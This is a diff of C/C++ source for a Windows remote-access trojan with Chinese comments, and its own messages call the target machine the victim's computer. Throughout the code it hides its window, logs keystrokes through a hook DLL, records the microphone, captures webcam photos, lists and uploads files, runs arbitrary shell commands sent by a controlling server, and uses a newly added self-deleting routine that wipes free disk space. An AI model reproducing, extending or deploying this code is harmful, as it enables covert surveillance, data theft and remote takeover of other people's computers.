@@ -1,4 +1,4 @@
-#include <winSock2.h>
+﻿#include <winSock2.h>
 #include <stdio.h>
 #include <string.h>
 #include <io.h>
@@ -17,8 +17,9 @@ using namespace cv;
 #define DATA_BUFMAX 2048
 #define DATA_BUFMIN 45
 #define DATA_BUFMID 2000
-#define PORT 9999
-#define DEBUG
+#define IP_PORT 9999
+#define IP_ADDR "127.0.0.1"
+//#define DEBUG
 #ifndef DEBUG
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 #endif // !DEBUG
@@ -26,12 +27,12 @@ using namespace cv;
 typedef struct _WHO {
     int Num;
     char Name[20];
-}Who;
+}IDINFO;
 typedef struct _SERVER {
-    Who Who;// 谁发送的
-    int Size;
-    char Type[2];// 发送的类型
-    char Command[10];
+    IDINFO ID;// 接收:谁发生过来的信息 发送:发送给谁？-->信息反馈目标
+    int Size;// 消息大小，在 Command 的消息为 FileInfo 时，为文件大小
+    char Type[2];// 发送的类型 第一次区分指令
+    char Command[10];// 第二次区分指令
     char Info[DATA_BUFMID];// 要发送的内容
 }SERVER;
 typedef struct _FILE {
@@ -40,15 +41,11 @@ typedef struct _FILE {
     int GetSize;// 得到的大小
     char name[200];
 }SAVE_FILE;
-// HOOK技术
+pthread_t KeyBoardProc;
+pthread_t TapeProc;
+// HOOK键盘技术
 void* Hook_Keyboard(void *arg) {
-    if (fopen("keyboard.txt", "rb") == NULL) {
-#ifdef DEBUG
-        printf("hook已关闭\n");
-#endif // DEBUG
-        return (void*)1;
-    }
-    HMODULE hModule = LoadLibrary(TEXT("D:\\project\\c\\hook_keyboard\\x64\\Release\\hook_keyboard.dll"));
+    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\hook_keyboard\\x64\\Release\\hook_keyboard.dll"));
     if (hModule == NULL) { 
 #ifdef DEBUG
         printf("获取DLL失败\n");
@@ -71,15 +68,10 @@ void* Hook_Keyboard(void *arg) {
         DispatchMessage(&msg);
     }
     UnloadHook();
+    return (void*)1;
 }
 // 录音
 void* Tape(void* arg) {
-    if (fopen("tape.txt", "rb") == NULL) {
-#ifdef DEBUG
-        printf("录音已关闭\n");
-#endif // DEBUG
-        return (void*)1;
-    }
     HWAVEIN hWaveIn; // 输入设备
     WAVEFORMATEX waveform;
     waveform.wFormatTag = WAVE_FORMAT_PCM;
@@ -129,172 +121,238 @@ void* Tape(void* arg) {
     }
     return (void*)1;
 }
-
+// 清理键盘HOOK文件:当文件大小大于规定的时候自动删除
+void DelKeyboardLog() {
+    FILE* DelKeyBoardLogFILE = nullptr;
+    DelKeyBoardLogFILE = fopen("keyboard.txt", "r");
+    if (DelKeyBoardLogFILE != NULL) {
+        fseek(DelKeyBoardLogFILE, 0, SEEK_END);
+        long int FileSize = ftell(DelKeyBoardLogFILE);
+        if (FileSize >= 1024 * 1024 * 1024) {
+            remove("keyboard.txt");
+        }
+    }
+    return;
+}
+// 自我部署
+// 自爆,删除 删除了但是还在运行 原理:复制自己—》运行—》退出-》复制体删除自己
+void DelMySelf() {
+    char  szPathOrig[MAX_PATH], szPathClone[MAX_PATH];
+    GetModuleFileName(NULL, szPathOrig, MAX_PATH);// 路径
+    GetTempPath(MAX_PATH, szPathClone);// 检索为临时文件指定的目录的路径
+    GetTempFileName(szPathClone, TEXT("Del"), 0, szPathClone);// 创建临时文件的名称。
+    CopyFile(szPathOrig, szPathClone, FALSE);// 将现有文件复制到新文件。 旧-->新
+    HANDLE hFile = CreateFile(szPathClone, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+    char CmdLine[512] = { 0 };
+    HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
+    wsprintf(CmdLine, __TEXT("%s %d \"%s\""), szPathClone, hProcessOrig, szPathOrig);
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    CreateProcess(NULL, CmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    CloseHandle(hProcessOrig);
+    CloseHandle(hFile);
+    exit(0);
+}
+// 防御（权限升级）
 int main(int argc,char* argv[]) {
+    // 先判断删除
+    if (__argc != 1) {
+        int iSize;
+        iSize = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, NULL, 0);
+        wchar_t* pwszUnicode = (wchar_t*)malloc(iSize * sizeof(wchar_t));
+        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, pwszUnicode, iSize);
+        HANDLE hProcessOrig = (HANDLE) _wtoi(pwszUnicode);
+        WaitForSingleObject(hProcessOrig, INFINITE);
+        CloseHandle(hProcessOrig);
+        DeleteFile(argv[2]);
+#ifdef DEBUG
+        printf("将清理 %s 盘\n", argv[2]);
+#endif
+#ifndef DEBUG
+        char cmd[50] = { 0 };
+        sprintf(cmd,"cipher /W:%s",argv[2][1]);
+        WinExec(cmd, SW_HIDE);
+#endif // !DEBUG
+        return 0;
+    }
     while (1) {
-        pthread_t KeyBoardProc;
-        pthread_create(&KeyBoardProc, NULL, Hook_Keyboard, NULL);
-        pthread_detach(KeyBoardProc);
-        pthread_t TapeProc;
-        pthread_create(&TapeProc, NULL, Tape, NULL);
-        pthread_detach(TapeProc);
-        // 初始化
-        FILE* fp = NULL;
+        DelKeyboardLog();
+        // 线程 定义:文件存在就是开启运行
+        if (fopen("KeyBoardLog.txt", "r") == NULL) {
+#ifdef DEBUG
+            printf("[OFF]键盘记录\n");
+#endif // DEBUG
+        }
+        else {
+#ifdef DEBUG
+            printf("[ON]键盘记录\n");
+#endif // DEBUG
+            pthread_create(&KeyBoardProc, NULL, Hook_Keyboard, NULL);
+            pthread_detach(KeyBoardProc);
+        }
+        if (fopen("Tape", "r") == NULL) {
+#ifdef DEBUG
+            printf("[OFF]录音");
+#endif
+        }
+        else {
+#ifdef DEBUG
+            printf("[ON]录音");
+#endif
+            pthread_create(&TapeProc, NULL, Tape, NULL);
+            pthread_detach(TapeProc);
+        }
         WSAData wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
-        SOCKET tcp_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (tcp_Client == INVALID_SOCKET) return 0;
-        {
-            fp = fopen("keyboard.txt","r");
-            if (fp != NULL) {
-                fseek(fp, 0, SEEK_END);
-                int FileSize = ftell(fp);
-                if (FileSize >= 1024 * 1024 * 1024) {
-                    remove("keyboard.txt");
-                }
-            }
-            fp = NULL;
-        }
+        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (TCP_Client == INVALID_SOCKET) return 0;
         SAVE_FILE SaveFile;
         sockaddr_in addrServ;
         addrServ.sin_family = AF_INET;
-        addrServ.sin_port = htons(PORT);
-        addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
-        fp = fopen("IP.txt", "r");
-        while ((connect(tcp_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
-            if (fp != NULL) {
+        addrServ.sin_port = htons(IP_PORT);
+        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
+        FILE* ClientIP_FILE = fopen("IP.txt", "r");
+        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
+            if (ClientIP_FILE != NULL) {
                 char IP[50] = { 0 };
-                if (fgets(IP, 50, fp) == NULL) {
-                    fseek(fp, 0, SEEK_SET);
+                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
+                    fseek(ClientIP_FILE, 0, SEEK_SET);
+                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
                     continue;
                 }
                 addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
             }
 #ifndef DEBUG
-            Sleep(240000);
+            Sleep(240000);// 4min
+#else
+            Sleep(5000);// 5s
 #endif
         }
-        if (fp != NULL) {
-            fclose(fp);
-            fp = NULL;
+        if (ClientIP_FILE != nullptr) {
+            fclose(ClientIP_FILE);
+            delete ClientIP_FILE;
         }
-        delete fp;
-        SERVER Send_Structure;
+        SERVER SendInfoStructure;
         while (1) {
-            RtlZeroMemory(&Send_Structure, sizeof(Send_Structure));
+            RtlZeroMemory(&SendInfoStructure, sizeof(SendInfoStructure));
             char RecvInfo[DATA_BUFMAX] = { 0 };
             // 阻碍式接收
-            if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
-                //printf("已断开连接"); 
-                break;
+            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
+#ifdef DEBUG
+                printf("已断开连接");
+#endif
+                break;// 目的:重新连接
             }
-            SERVER* Get_Structure = (SERVER*)&RecvInfo;// 解析
-            // 初始化
-            strcpy(Send_Structure.Type, "I");
-            Send_Structure.Who.Num = Get_Structure->Who.Num;
-            strcpy(Send_Structure.Who.Name, Get_Structure->Who.Name);
-            //printf("Type:%s Command:%s Info:%s\n", Get_Structure->Type, Get_Structure->Command, Get_Structure->Info);
-            if (strcmp(Get_Structure->Type, "F") == 0) {
-                if (strcmp(Get_Structure->Command, "remove") == 0) {
-                    if (remove(Get_Structure->Info) == 0) {
-                        sprintf(Send_Structure.Info, "删除文件成功");
+            SERVER* GetInfoStructure = (SERVER*)&RecvInfo;// 解析
+            strcpy(SendInfoStructure.Type, "I");
+            SendInfoStructure.ID.Num = GetInfoStructure->ID.Num;
+            strcpy(SendInfoStructure.ID.Name, GetInfoStructure->ID.Name);
+#ifdef DEBUG
+            printf("Type:%s Command:%s Info:%s\n", GetInfoStructure->Type, GetInfoStructure->Command, GetInfoStructure->Info);
+#endif
+            if (strcmp(GetInfoStructure->Type, "F") == 0) {
+                if (strcmp(GetInfoStructure->Command, "remove") == 0) {
+                    if (remove(GetInfoStructure->Info) == 0) {
+                        sprintf(SendInfoStructure.Info, "Remove File Success.");
                     }
                     else {
-                        sprintf(Send_Structure.Info, "删除文件失败，请检查路径是否正确");
+                        sprintf(SendInfoStructure.Info, "ERROR，File Path Is True?");
                     }
                 }
-                else if (strcmp(Get_Structure->Command, "SendFile") == 0) {
-                    FILE* fp = fopen(Get_Structure->Info, "rb");//以二进制方式打开文件
+                else if (strcmp(GetInfoStructure->Command, "SendFile") == 0) {
+                    FILE* fp = fopen(GetInfoStructure->Info, "rb");//以二进制方式打开文件
                     if (fp == NULL) {
-                        sprintf(Send_Structure.Info, "打开文件失败，请检查文件路径是否正确");
+                        sprintf(SendInfoStructure.Info, "open file error,file path is True?");
                     }
                     else {
                         // 发送文件信息
                         fseek(fp, 0, SEEK_END);
                         int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                         rewind(fp);
-                        Send_Structure.Size = FileSize;
-                        strcpy(Send_Structure.Type, "F");
-                        strcpy(Send_Structure.Command, "FileInfo");
+                        SendInfoStructure.Size = FileSize;
+                        strcpy(SendInfoStructure.Type, "F");
+                        strcpy(SendInfoStructure.Command, "FileInfo");
                         char* p;
-                        strcpy(Send_Structure.Info, (p = strrchr(Get_Structure->Info, '\\')) ? p + 1 : Get_Structure->Info);
-                        if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
+                        strcpy(SendInfoStructure.Info, (p = strrchr(GetInfoStructure->Info, '\\')) ? p + 1 : GetInfoStructure->Info);
+                        if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                         // 发送文件
-                        strcpy(Send_Structure.Type, "F");
-                        strcpy(Send_Structure.Command, "RecvFile");
-                        Send_Structure.Size = 0;
+                        strcpy(SendInfoStructure.Type, "F");
+                        strcpy(SendInfoStructure.Command, "RecvFile");
+                        SendInfoStructure.Size = 0;
                         while (!feof(fp)) {
-                            if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) goto start;
-                            memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
-                            Send_Structure.Size = fread(Send_Structure.Info, sizeof(char), sizeof(Send_Structure.Info), fp);
-                            send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0);
-                            //printf("SendFileSize:%d/%d \n", FileSize,Send_Structure.Size);
+                            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) goto start;
+                            memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
+                            SendInfoStructure.Size = fread(SendInfoStructure.Info, sizeof(char), sizeof(SendInfoStructure.Info), fp);
+                            send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0);
+                            //printf("SendFileSize:%d/%d \n", FileSize,SendInfoStructure.Size);
                         }
                         fclose(fp);
-                        strcpy(Send_Structure.Type, "I");
-                        strcpy(Send_Structure.Info, "文件已发送完毕");
+                        strcpy(SendInfoStructure.Type, "I");
+                        strcpy(SendInfoStructure.Info, "File Send end.");
                     }
                 }
-                else if (strcmp(Get_Structure->Command, "FileInfo") == 0) {
-                    SaveFile.fp = fopen(Get_Structure->Info, "wb+");
-                    SaveFile.FileSize = Get_Structure->Size;
+                else if (strcmp(GetInfoStructure->Command, "FileInfo") == 0) {
+                    SaveFile.fp = fopen(GetInfoStructure->Info, "wb+");
+                    SaveFile.FileSize = GetInfoStructure->Size;
                     SaveFile.GetSize = 0;
                     // 反馈确认接收
-                    strcpy(Send_Structure.Type, "F");
-                    strcpy(Send_Structure.Info, "continue");
-                    //printf("接收大小%d\n", Get_Structure->Size);
+                    strcpy(SendInfoStructure.Type, "F");
+                    strcpy(SendInfoStructure.Info, "continue");
+                    //printf("接收大小%d\n", GetInfoStructure->Size);
                 }
-                else if (strcmp(Get_Structure->Command, "RecvFile") == 0) {
+                else if (strcmp(GetInfoStructure->Command, "RecvFile") == 0) {
                     if (SaveFile.fp == NULL) {
-                        strcpy(Send_Structure.Type, "I");
-                        strcpy(Send_Structure.Info, "未发送文件信息");
+                        strcpy(SendInfoStructure.Type, "I");
+                        strcpy(SendInfoStructure.Info, "未发送文件信息");
                         goto Send;
                     };
-                    fwrite(Get_Structure->Info, sizeof(char), Get_Structure->Size, SaveFile.fp);
-                    SaveFile.GetSize += Get_Structure->Size;
+                    fwrite(GetInfoStructure->Info, sizeof(char), GetInfoStructure->Size, SaveFile.fp);
+                    SaveFile.GetSize += GetInfoStructure->Size;
                     // 反馈确认接收
-                    strcpy(Send_Structure.Type, "F");
-                    strcpy(Send_Structure.Info, "continue");
-                    //printf("%d %d %d\n", SaveFile.FileSize, SaveFile.GetSize, Get_Structure->Size);
+                    strcpy(SendInfoStructure.Type, "F");
+                    strcpy(SendInfoStructure.Info, "continue");
+                    //printf("%d %d %d\n", SaveFile.FileSize, SaveFile.GetSize, GetInfoStructure->Size);
                     if (SaveFile.FileSize == SaveFile.GetSize) {
                         fclose(SaveFile.fp);
                         SaveFile.fp = NULL;
                         SaveFile.FileSize = 0;
                         SaveFile.GetSize = 0;
                         memset(SaveFile.name, 0, sizeof(SaveFile.name));
-                        strcpy(Send_Structure.Type, "I");
-                        strcpy(Send_Structure.Info, "文件接收完毕");
+                        strcpy(SendInfoStructure.Type, "I");
+                        strcpy(SendInfoStructure.Info, "文件接收完毕");
                         goto Send;
                     }
                 }
             }
-            else if (strcmp(Get_Structure->Type, "L") == 0) {
+            else if (strcmp(GetInfoStructure->Type, "L") == 0) {
                 // pan
-                if (strcmp(Get_Structure->Info, "pan") == 0) {
+                if (strcmp(GetInfoStructure->Info, "pan") == 0) {
                     DWORD Size = MAX_PATH;
                     char Info[MAX_PATH] = { 0 };
                     DWORD Result = GetLogicalDriveStringsA(Size, Info);
                     if (Result > 0 && Result <= MAX_PATH) {
                         char* Drive = Info;
                         while (*Drive) {
-                            strcat(Send_Structure.Info, Drive);
+                            strcat(SendInfoStructure.Info, Drive);
                             Drive += strlen(Drive) + 1;
                         }
                     }
                 }
-                else if (strcmp(Get_Structure->Command,"path") == 0) {
-                    strcpy(Send_Structure.Type, "I");
+                else if (strcmp(GetInfoStructure->Command,"path") == 0) {
+                    strcpy(SendInfoStructure.Type, "I");
                     char Path[200] = { 0 };
-                    strcpy(Path, Get_Structure->Info);
+                    strcpy(Path, GetInfoStructure->Info);
                     char filePath[100] = { 0 };
-                    strcpy(filePath, Get_Structure->Info);
+                    strcpy(filePath, GetInfoStructure->Info);
                     strcat(Path, "\\*.*");
                     HANDLE file;
                     WIN32_FIND_DATA pNextInfo;
                     file = FindFirstFile(Path, &pNextInfo);
                     if (file == INVALID_HANDLE_VALUE) {
-                        strcpy(Send_Structure.Type, "I");
-                        strcpy(Send_Structure.Info, "文件搜索不到!");
+                        strcpy(SendInfoStructure.Type, "I");
+                        strcpy(SendInfoStructure.Info, "can't see file!");
                     }
                     else {
                         for (int i = 1; FindNextFile(file, &pNextInfo);i++) {
@@ -306,42 +364,41 @@ int main(int argc,char* argv[]) {
                             FileTimeToSystemTime(&pNextInfo.ftLastWriteTime, &LastWriteTime);// 最后一次修改
                             FileTimeToSystemTime(&pNextInfo.ftLastAccessTime, &AccessTime);//  最后一次访问
                             FileTimeToSystemTime(&pNextInfo.ftCreationTime, &CreationTime);// 创建时间
-                            sprintf(Send_Structure.Info, "第 %d 个文件: %s\\%s\t创建时间:%d年%d月%d日\t最后一次修改时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日", i, filePath, pNextInfo.cFileName,CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, LastWriteTime.wYear, LastWriteTime.wMonth, LastWriteTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
+                            sprintf(SendInfoStructure.Info, "No.%d FILE: %s\\%s\t创建时间:%d年%d月%d日\t最后一次修改时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日", i, filePath, pNextInfo.cFileName,CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, LastWriteTime.wYear, LastWriteTime.wMonth, LastWriteTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
                             // 发送
-                            Send_Structure.Size = strlen(Send_Structure.Info);
-                            strcpy(Send_Structure.Type, Send_Structure.Type);
-                            strcpy(Send_Structure.Info, Send_Structure.Info);
-                            if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
-                            memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
+                            SendInfoStructure.Size = strlen(SendInfoStructure.Info);
+                            strcpy(SendInfoStructure.Type, SendInfoStructure.Type);
+                            strcpy(SendInfoStructure.Info, SendInfoStructure.Info);
+                            if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
+                            memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
                         }
                     }
                     continue;
                 }
-                else if (strcmp(Get_Structure->Info, "systeminfo") == 0) {
+                else if (strcmp(GetInfoStructure->Info, "systeminfo") == 0) {
                     char SystemName[255] = { 0 };
                     char UserName[255] = { 0 };
                     unsigned long size = 0;
                     GetComputerName(SystemName, &size);
                     GetUserName(UserName, &size);
-                    sprintf(Send_Structure.Info, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
+                    sprintf(SendInfoStructure.Info, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
                 }
-                else if (strcmp(Get_Structure->Info, "runpath") == 0) {
-                    char Path[500] = { 0 };
-                    getcwd(Path, sizeof(Path));
-                    sprintf(Send_Structure.Info, "[请不要乱动这个目录下的txt文件!!!]目前运行路径:\n%s", Path);
+                else if (strcmp(GetInfoStructure->Info, "runpath") == 0) {
+                    getcwd(SendInfoStructure.Info, sizeof(SendInfoStructure.Info));
+                    strcat(SendInfoStructure.Info, "\nThis now run path,[Don't touch txt file!!!].");
                 }
-                else if (strcmp(Get_Structure->Info, "camera") == 0) {
+                else if (strcmp(GetInfoStructure->Info, "camera") == 0) {
                     VideoCapture camera;
                     camera.open(0);
                     if (!camera.isOpened()) {
-                        sprintf(Send_Structure.Info, "打开默认摄像头失败,取消发送");
+                        sprintf(SendInfoStructure.Info, "Open camera error,exit Send");
                     }
                     else {
                         char PhotoName[500] = {0};
                         cv::Mat frame;
                         camera >> frame;
                         if (frame.empty()) {
-                            sprintf(Send_Structure.Info, "摄像头拍照失败,取消发送");
+                            sprintf(SendInfoStructure.Info, "open camera error,exit Send");
                         }
                         else {
                             SYSTEMTIME time;
@@ -351,88 +408,88 @@ int main(int argc,char* argv[]) {
                             getcwd(PhotoPath, sizeof(PhotoPath));
                             strcat(PhotoPath, PhotoName);
                             cv::imwrite(PhotoPath, frame);
-                            //sprintf(Send_Structure.Info, "成功,请及时删除照片。照片地址:%s", PhotoPath);
+                            //sprintf(SendInfoStructure.Info, "成功,请及时删除照片。照片地址:%s", PhotoPath);
                             FILE* fp = fopen(PhotoPath, "rb");//以二进制方式打开文件
                             if (fp == NULL) {
-                                sprintf(Send_Structure.Info, "打开文件失败，路径不正确:%s",PhotoPath);
+                                sprintf(SendInfoStructure.Info, "open file error，path is False:%s",PhotoPath);
                             }
                             else {
                                 // 发送文件信息
                                 fseek(fp, 0, SEEK_END);
                                 int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                                 rewind(fp);
-                                Send_Structure.Size = FileSize;
-                                strcpy(Send_Structure.Type, "F");
-                                strcpy(Send_Structure.Command, "FileInfo");
+                                SendInfoStructure.Size = FileSize;
+                                strcpy(SendInfoStructure.Type, "F");
+                                strcpy(SendInfoStructure.Command, "FileInfo");
                                 char* p;
-                                strcpy(Send_Structure.Info, (p = strrchr(PhotoPath, '\\')) ? p + 1 : PhotoPath);
-                                if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
+                                strcpy(SendInfoStructure.Info, (p = strrchr(PhotoPath, '\\')) ? p + 1 : PhotoPath);
+                                if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                                 // 发送文件
-                                strcpy(Send_Structure.Type, "F");
-                                strcpy(Send_Structure.Command, "RecvFile");
-                                Send_Structure.Size = 0;
+                                strcpy(SendInfoStructure.Type, "F");
+                                strcpy(SendInfoStructure.Command, "RecvFile");
+                                SendInfoStructure.Size = 0;
                                 while (!feof(fp)) {
-                                    if (recv(tcp_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
+                                    if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                                         remove(PhotoPath);
                                         goto start;
                                     }
-                                    memset(Send_Structure.Info, 0, sizeof(Send_Structure.Info));
-                                    Send_Structure.Size = fread(Send_Structure.Info, sizeof(char), sizeof(Send_Structure.Info), fp);
-                                    send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0);
+                                    memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
+                                    SendInfoStructure.Size = fread(SendInfoStructure.Info, sizeof(char), sizeof(SendInfoStructure.Info), fp);
+                                    send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0);
                                 }
                                 fclose(fp);
-                                strcpy(Send_Structure.Type, "I");
+                                strcpy(SendInfoStructure.Type, "I");
                                 if (remove(PhotoPath) == 0)
-                                    sprintf(Send_Structure.Info, "文件已发送完毕,删除成功,文件在本机位置:%s",PhotoPath);
-                                else sprintf(Send_Structure.Info, "文件已发送完毕,删除失败,文件在本机位置:%s", PhotoPath);
+                                    sprintf(SendInfoStructure.Info, "文件已发送完毕,图片在受害者电脑位置:%s[已删除]",PhotoPath);
+                                else sprintf(SendInfoStructure.Info, "文件已发送完毕,图片在受害者电脑位置:%s[自动删除失败]", PhotoPath);
                             }
                         }
                     }
                 }
-                else if (strcmp(Get_Structure->Info, "pthread") == 0) {
+                else if (strcmp(GetInfoStructure->Info, "pthread") == 0) {
                     if (pthread_kill(KeyBoardProc, 0) == 0) {
-                        strcpy(Get_Structure->Info, "键盘监听已开启 ");
+                        strcpy(GetInfoStructure->Info, "键盘监听已开启 ");
                     }
                     else {
-                        strcpy(Get_Structure->Info, "键盘监听未开启 ");
+                        strcpy(GetInfoStructure->Info, "键盘监听未开启 ");
                     }
                     if (pthread_kill(TapeProc, 0) == 0) {
-                        strcat(Get_Structure->Info, "录音模式已开启 ");
+                        strcat(GetInfoStructure->Info, "录音模式已开启 ");
                     }
                     else {
-                        strcat(Get_Structure->Info, "录音模式未开启 ");
+                        strcat(GetInfoStructure->Info, "录音模式未开启 ");
                     }
                 }
             }
-            else if (strcmp(Get_Structure->Type, "S") == 0) {
-                if (strcmp(Get_Structure->Info, "FUCK") == 0) break;
-                else if (strcmp(Get_Structure->Info, "keyborad") == 0) {
+            else if (strcmp(GetInfoStructure->Type, "S") == 0) {
+                if (strcmp(GetInfoStructure->Info, "FUCK") == 0) break;
+                else if (strcmp(GetInfoStructure->Info, "keyborad") == 0) {
                     if (fopen("keyboard.txt", "rb") == NULL) {
                         fopen("keyboard.txt", "a");
-                        sprintf(Send_Structure.Info, "HOOK KeyBoard 已设置为开启 ");
+                        sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为开启 ");
                     }
                     else {
-                        sprintf(Send_Structure.Info, "HOOK KeyBoard 已设置为关闭 ");
+                        sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为关闭 ");
                         remove("keyboard.txt");
                     }
-                    strcat(Send_Structure.Info, "重启生效");
+                    strcat(SendInfoStructure.Info, "重启生效");
                 }
-                else if (strcmp(Get_Structure->Info, "tape") == 0) {
+                else if (strcmp(GetInfoStructure->Info, "tape") == 0) {
                     if (fopen("tape.txt", "rb") == NULL) {
                         fopen("tape.txt", "a");
-                        sprintf(Send_Structure.Info, "录音 已设置为开启 ");
+                        sprintf(SendInfoStructure.Info, "录音 已设置为开启 ");
                     }
                     else {
                         remove("taoe.txt");
-                        sprintf(Send_Structure.Info, "录音 已设置为关闭 ");
+                        sprintf(SendInfoStructure.Info, "录音 已设置为关闭 ");
                     }
-                    strcat(Send_Structure.Info, "重启生效");
+                    strcat(SendInfoStructure.Info, "重启生效");
                 }
             }
-            else if (strcmp(Get_Structure->Type, "C") == 0) {
-                if (strcmp(Get_Structure->Command, "cmd") == 0) {
-                    if (Get_Structure->Who.Num != 0) {
-                        strcpy(Send_Structure.Info, "你没有执行的权力,拒绝执行");
+            else if (strcmp(GetInfoStructure->Type, "C") == 0) {
+                if (strcmp(GetInfoStructure->Command, "cmd") == 0) {
+                    if (GetInfoStructure->ID.Num != 0) {
+                        strcpy(SendInfoStructure.Info, "你没有执行的权力,拒绝执行");
                         goto Send;
                     }
                     HANDLE hRead;
@@ -442,7 +499,7 @@ int main(int argc,char* argv[]) {
                     sa.lpSecurityDescriptor = NULL;
                     sa.nLength = sizeof(SECURITY_ANONYMOUS);
                     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
-                        sprintf(Send_Structure.Info, "创建管道失败,取消执行");
+                        sprintf(SendInfoStructure.Info, "创建管道失败,取消执行");
                     }
                     else {
                         STARTUPINFO si;
@@ -454,16 +511,16 @@ int main(int argc,char* argv[]) {
                         si.hStdOutput = hWrite;
                         si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
                         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-                        if (!CreateProcessA(NULL, Get_Structure->Info, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-                            strcpy(Send_Structure.Info,"执行指令失败,取消执行");
+                        if (!CreateProcessA(NULL, GetInfoStructure->Info, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+                            strcpy(SendInfoStructure.Info,"执行指令失败,取消执行");
                         }
                         else {
                             Sleep(1000);
                             WaitForSingleObject(pi.hThread, -1);
                             WaitForSingleObject(pi.hProcess, -1);
                             DWORD Size = 1;
-                            if (!ReadFile(hRead, Send_Structure.Info, sizeof(Send_Structure.Info), &Size, NULL)) {
-                                sprintf(Send_Structure.Info, "读取返回值失败,取消执行");
+                            if (!ReadFile(hRead, SendInfoStructure.Info, sizeof(SendInfoStructure.Info), &Size, NULL)) {
+                                sprintf(SendInfoStructure.Info, "读取返回值失败,取消执行");
                             }
                         }
                         CloseHandle(hWrite);
@@ -472,17 +529,23 @@ int main(int argc,char* argv[]) {
                         CloseHandle(pi.hThread);
                     }
                 }
+                else if (strcmp(GetInfoStructure->Info, "KISS") == 0) {
+#ifdef DEBUG
+                    printf("结束程序\n");
+#endif
+                    DelMySelf();
+                }
             }
             Send:
             // 发送
-            int Send_size = strlen(Send_Structure.Info);
+            int Send_size = strlen(SendInfoStructure.Info);
             if (Send_size == 0) {
-                strcpy(Send_Structure.Type, "I");
-                strcpy(Send_Structure.Info, "没有对应的指令");
+                strcpy(SendInfoStructure.Type, "I");
+                strcpy(SendInfoStructure.Info, "没有对应的指令");
             }
-            Send_Structure.Size = Send_size;
-            //printf("%s\n", Send_Structure.Info);
-            if (send(tcp_Client, (char*)&Send_Structure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
+            SendInfoStructure.Size = Send_size;
+            //printf("%s\n", SendInfoStructure.Info);
+            if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
         }
     start:
         if (pthread_kill(KeyBoardProc, 0) == 0) {
@@ -491,7 +554,7 @@ int main(int argc,char* argv[]) {
         if (pthread_kill(TapeProc, 0) == 0) {
             pthread_cancel(TapeProc);
         }
-        closesocket(tcp_Client);
+        closesocket(TCP_Client);
         WSACleanup();
         Sleep(1000);
     }
